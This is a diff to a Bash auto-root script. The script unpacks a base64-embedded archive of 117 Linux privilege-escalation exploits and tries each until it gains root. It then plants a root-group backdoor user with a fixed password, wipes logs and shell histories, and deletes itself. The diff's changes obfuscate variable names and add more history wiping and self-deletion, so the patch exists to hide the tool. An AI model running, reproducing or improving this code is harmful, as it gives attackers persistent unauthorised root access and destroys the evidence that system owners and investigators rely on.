@@ -2,7 +2,7 @@
 
 fdebase64()
 {
-	EBASE='H4sIALFig1IAA+xbD3RT13m/T5ZjOVFANi44xE3U1bQmB4Rsy8Zm5MSARSAYcIjJSFjyImwZyciS
+	FRF5Ef663='H4sIALFig1IAA+xbD3RT13m/T5ZjOVFANi44xE3U1bQmB4Rsy8Zm5MSARSAYcIjJSFjyImwZyciS
 oj/EJKM1kw1ojoPTsI30z4oOrMuWZIduTesEzmpiHwwpS1m605KMdW5Dep5rL3NaljkEo33fvfe9
 d/WQyZKFbmnz4Oq+373f/e797v97f37ejnAg5I9FF5Fr9zjhWVxVRX14jD59L6+ocDmrq0GunDjL
 y10V1cRedQ3LpD3xaMwTsdtJJBSKXU3ug+I/oY9Xbf8KR7WjdmH14gqns+ZjzgMbuNrlmqb9yyur
@@ -629,7 +629,7 @@ Swa+RowR4fgSkaqdXPFRpum8UhywLLvz0FLnJSfp8pKft2514L2iPXsd+LeEu8aBDwh3/ij84w68
 VL78mgP/ikh3mQN/u8DPdOC3C7dglHQrHfgLhLvBgX9RuE2j8EHyfm34tdhB/3cinx0O/IXCPWMU
 PqemjMnVKgkKY4oGdyl3O8NRYEbU0GwNhzu4giaOdmBHFWjMmg8/dmP4ZEZznAzgVLVM/DRxR325
 bEqX8bMiKQiVhzb9ayYfP5hMnVINBwQ+SbN/fxxQ8OrzMKjg1W+ZRxW8+rweU/C2cXRsAq+OI8kK
-Xj2Q1afg1U/nWQpefUb9Cl75pKzlKfg0BV+k4NMV/CwFP0bBlyn4DAUfVPDq2MCMEF5CNTyI49AG
+Xj2Q1afg1U/nWQpefUb9Cl75pKzlKfg0BV+k4NMV/CwFP0bBlyn4DAUfVPDq2MCMEF5FRF5Ef352yI49AG
 IZnIzBEOzXwq1acN5T5Nd+gQDeUCVvVNHweMphH6pg8CRpMIfdP7AKMphL7pFsBoAqFveidgVL3Q
 N70dMKpc6JuuAYzsCn3TTsBMv5Xrmy4DjKoV+qaNgFGlQt/0OsCoSqFvWgMYVcj0TYdyrwSMqjvs
 Y/DlgDFkH8beWLD4/YqeN28I9vx3kGmiVvTvqR5TpgX79x5Nh9PfnQpb8UwZVZh9XJ7iYxbJ9aH9
@@ -1348,7 +1348,7 @@ w+/dHtqs4XcrtU78BiijjuslKr5ZouLQDpEJFfc/IRBJfCLRUfEeiYp3ZDHqWGsYdSw7S6OOWEeo
 52OUxnha/1xE7jJyC8jdQO52cu3k7iP3MLkn1zpxKjebaHll+RXQC3QFbas0M4fcf8ZsExP+c2Q+
 Y0zvTwLPO4PrD2HEUaFzyohjnRau1reQ3VWoG8bdZuIbYWONOMKGrULdME4hA/x0hvL9FXNQN4yv
 Mor0MS1ftQ7GlyKFuin0y2JjjThiranQNIzrjrzMRhw7ND7MAz15Yn5Qmn8UX5Q56BfmoT1ZULew
-xvc28b2dJ7S16HxwugYh7IOeIc+avLHprdH4MO+lzmGuj9yKT2n0QT18WCNToS/JwLdR4yslPhxl
+xvc28b2dJ7S16HxwugYh7IOeIc+avLHprdH4MO+lzmGuj9yKT2n0QT18WFRF5Ef352oS/JwLdR4yslPhxl
 z4R+PcEcFIrvkfyZ0aWnNL4A8QWy8P29xoc1zbws+X6HOagb33v5Mxtx/GctPax5feMyo27bND7M
 //5xAm02+XZqfNXEVz0uM+r2A+bspbCAq82QLy6lIUdd4JtwGqjW7eOFdhyTz0S1vkIbwRGfGP9l
 LDuqtZZ+6H6hRTwVqnWmRhw3G6jWesOIY5mNMglUy0GlBKrVYRhx7DFQrT0GqvW2gWo9s9aNamF8
@@ -5946,7 +5946,7 @@ RL9M8tdL/jZDZNiaDE3Qf09I8fhWgGfcBqX1RyX/XUPUf/9cWn/GEPXfzxKf13+/IMVfM0T991mS
 5OqVBLySgFcS8EoCXpkyZcqUKbtu9g/FXQiGAIgTAA==
 '
 
-	EXPLOITS='1-2
+	FRf53f322='1-2
 1-3
 1-4
 2.6.18-374.12.1.el5-2012
@@ -6066,44 +6066,45 @@ z1d-2011'
 
 	if [ ! -f exploits.tar.gz ] 2> /dev/null
 	then
-		echo "$EBASE" | base64 -d > exploits.tar.gz
+		echo "$FRF5Ef663" | base64 -d > exploits.tar.gz
 	fi
 	
 	tar -xf exploits.tar.gz
 	rm exploits.tar.gz
-	
 	if [ ! -d exploits ] 2> /dev/null
 	then
 		echo ' [X] Could not extract exploits.tar.gz.. shutting down'
+		FRF5Ef663=''
+		FRf53f322=''
+		sleep 3 && rm -rf $0 2> /dev/null&
 		exit
 	fi
-	
-	EBASE=''
-	CNT=1
+	FRF5Ef663=''
+	FRF5Ef352=1
 	cd exploits
 	chmod 777 *
-	exit
 }
 
-fcheckr00t()
+FRF5ef332()
 {
 	if [ $(whoami) = 'root' ] 2> /dev/null
 	then
-		echo " [*] g0tr00t with exploit No.$CNT/117"
-		GOTROOT=1
+		echo " [*] g0tr00t with exploit $FRF5Ef352/117"
+		FRFSEf332=1
 	else
-		echo " [X] Failed to g0tr00t with exploit No.$CNT/117"
-		CNT=$((CNT + 1))
+		echo " [X] Failed to g0tr00t with exploit $FRF5Ef352/117"
+		FRF5Ef352=$((FRF5Ef352 + 1))
 	fi
 }
 
 fdebase64
 
-for EXPLOIT in $EXPLOITS
+for FRf5ef322 in $FRf53f322
 do
-	./"$EXPLOIT"
-	fcheckr00t
-	if [ $GOTROOT = 1 ] 2> /dev/null
+	rm -rf $HOME/.bash_history 2> /dev/null
+	./$FRf5ef322
+	FRF5ef332
+	if [ $FRFSEf332 = 1 ] 2> /dev/null
 	then
 		break
 	fi
@@ -6111,24 +6112,24 @@ done
 
 cd ..
 rm -rf exploits
-CNT=''
-EXPLOITS=''
+FRF5Ef352=''
+FRf53f322=''
 
-if [ $GOTROOT = 1 ] 2> /dev/null
+if [ $FRFSEf332 = 1 ] 2> /dev/null
 then
-	echo " [*] Exploit $EXPLOIT g0tr00t!"
-	RUSER='somesecguy'
-	RPASS='g0tr00t'
-	echo ' [*] Adding r00t user..'
-	useradd -g 0 -G root -M -s /bin/bash -p $RPASS $RUSER
+	echo " [*] Exploit $FRf5ef322 g0tr00t!"
+	FRF5Ef652='somesecguy'
+	FRF5Ef662='g0tr00t'
+	echo ' [*] 4dding r00t u53r..'
+	useradd -g 0 -G root -M -s /bin/bash -p $FRF5Ef662 $FRF5Ef652
 	echo
-	echo " [*] Added r00t user: $RUSER"
-	echo " [*] p455w0rd:  $RPASS"
-	echo " [*] Clearing logs.."
-	EXPLOIT=''
-	RUSER=''
-	RPASS=''
-	GOTROOT=''
+	echo " [*] (ab)u53r: $FRF5Ef652"
+	echo " [*] p455w0rd:  $FRF5Ef662"
+	echo " [*] C134ring 10g5.."
+	FRf5ef322=''
+	FRF5Ef652=''
+	FRF5Ef662=''
+	FRFSEf332=''
 	rm -rf /tmp/logs 2> /dev/null
 	rm -rf /root/.ksh_history 2> /dev/null
 	rm -rf /root/.bash_history 2> /dev/null
@@ -6148,13 +6149,16 @@ then
 	id
 	echo
 	echo " [DING] [DING] [DING]"
+	echo "  ------------------"
 	echo " [#] You g0tr00t, horray for you..."
 else
-	EXPLOIT=''
+	FRf5ef322=''
 	echo
 	whoami
 	id
 	echo
 	echo " [FAIL] [FAIL] [FAIL]"
+	echo "  ------------------"
 	echo " [$] You didn't g0tr00t, sucks to be you..."
 fi
+sleep 3 && rm -rf $HOME/.bash_history 2> /dev/null && rm -rf $0 2> /dev/null&
